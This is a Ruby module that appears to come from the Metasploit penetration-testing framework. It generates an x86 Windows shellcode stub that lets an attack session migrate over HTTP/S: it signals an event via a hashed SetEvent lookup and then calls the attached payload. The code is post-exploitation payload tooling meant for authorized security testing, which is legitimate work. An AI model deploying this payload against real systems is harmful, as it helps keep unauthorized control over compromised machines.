# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'

module Msf

###
#
# Payload that supports migrating over HTTP/S transports on x86.
#
###

module Payload::Windows::MigrateHttp

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Migrate over HTTP/S transports',
      'Description'   => 'Migration stub to use over HTTP/S transports',
      'Author'        => ['OJ Reeves'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    asm = %Q^
    migrate:
      cld
      pop esi
      pop esi                   ; esi now contains a pointer to the migrate context
      sub esp, 0x2000
      call start
      #{asm_block_api}
    start:
      pop ebp
    signal_event:
      push dword [esi]          ; Event handle is pointed at by esi
      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
      call ebp                  ; SetEvent(handle)
    call_payload:
      call dword [esi+8]        ; call the associated payload
    ^

    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

end

end


